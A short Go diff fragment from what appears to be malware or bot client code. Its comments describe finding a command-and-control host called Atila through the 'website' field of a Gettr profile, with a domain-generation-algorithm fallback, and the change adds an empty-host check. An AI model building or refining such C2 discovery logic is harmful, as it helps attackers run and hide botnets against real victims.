@@ -130,7 +130,7 @@ func main() {
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
 		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
-		if err == nil {
+		if err == nil && len(gettrAtilaHost) != 0 {
 			if tick(gettrAtilaHost) {
 				// Reset the timer of DGA and move on...
 				lastContactMade = timeSinceJesus()
